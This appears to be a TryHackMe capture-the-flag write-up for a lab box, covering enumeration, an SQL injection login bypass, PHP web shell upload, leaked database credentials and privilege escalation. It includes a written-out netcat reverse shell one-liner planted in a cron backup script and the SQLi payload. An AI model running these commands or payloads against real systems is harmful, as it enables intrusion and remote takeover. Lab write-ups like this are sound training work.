---
title: First Post
date: 2025-09-27 15:00:00 +/-0000
categories: [THM]
tags: [enumeration]
image: https://tryhackme-images.s3.amazonaws.com/room-icons/6187c9220cd0ff0c5c3b29b9aa6252ea.png
---

After running nmap scan on the target, I got:

`nmap -A 10.10.194.9`

```bash
Nmap scan report for 10.10.194.9
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)
|   256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)
|_  256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

```

Upon visiting port `80/HTTP`, I got an apache server default page:

![thm-plotted-tms-home.png](assets/img/posts/thm-plotted-tms-home.png)
_Default Apache Server Page_

Then I decided to enumerate other pages on the webapp by using `dirsearch`:

`dirsearch -u http://10.10.194.9/`

```bash
[12:14:54] 200 -  452B  - /admin/
[12:15:19] 200 -   25B  - /passwd
```

The `/admin/` page had open directory enabled, and there was a file named `id_rsa`, which immediately made me think about the ssh port I had seen earlier on nmap.

However, it later turned out to be a base64 encoding of the text `Trust me it is not this easy..now get back to enumeration :D` 😂

The `/passwd` route returned a base64 encoded text, which decoded as `not this easy :D` 😆

I then ran dirsearch on port `445`:

`dirsearch -u http://10.10.194.9:445/`

```bash
[12:23:28] 200 -    4KB - /management/
```
Upon visiting the `/management/` route, I was greeted with a login page.

I tried a few SQLi payloads and `' or '1'='1'#` worked. I was then on the dashboard. 

Then I went onto the profile management page, and uploaded a php shell, and I was in. 

Upon visiting `initialize.php`, I saw database credentials:

```php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','/management/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"tms_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"Password@123");
if(!defined('DB_NAME')) define('DB_NAME',"tms_db");
?>
```

I used the credentials to explore the database, and found a users table which has 2 hashed passwords:

![thm-plotted-tms-hashes.png](assets/img/posts/thm-plotted-tms-hashes.png)
_Hashes.com lookup results_

I tried to use these credentials to my benefit, however, they didn't work anywhere. 

After a bit of exploring, I found that there was `user.txt` in user `plot_admin`'s home directory. 

Later, I found a `backup.sh` file in `/var/www/scripts`, and I could edit it. 

```bash
www-data@plotted:/var/www/scripts$ rm -rf backup.sh
rm -rf backup.sh
www-data@plotted:/var/www/scripts$
www-data@plotted:/var/www/scripts$ ls
ls

www-data@plotted:/var/www/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.39.101 4445 >/tmp/f" > backup.sh
<h -i 2>&1|nc 10.23.39.101 4445 >/tmp/f" > backup.sh
www-data@plotted:/var/www/scripts$ cat backup.sh
cat backup.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.39.101 4445 >/tmp/f
www-data@plotted:/var/www/scripts$
www-data@plotted:/var/www/scripts$ chmod +x backup.sh
chmod +x backup.sh
www-data@plotted:/var/www/scripts$ date
date
Sat Sep 27 12:44:03 UTC 2025
www-data@plotted:/var/www/scripts$
```

After listening on the other shell and sending the `date` command, I got the response from the server and got access to the `plot_admin` admin account. I then cat'd the user.txt flag.

To get root.txt, I just used basic privesc techniques, and realised I could run `doas` as root, and I used [GTFOBins](https://gtfobins.github.io/) guide to echo root.txt file. 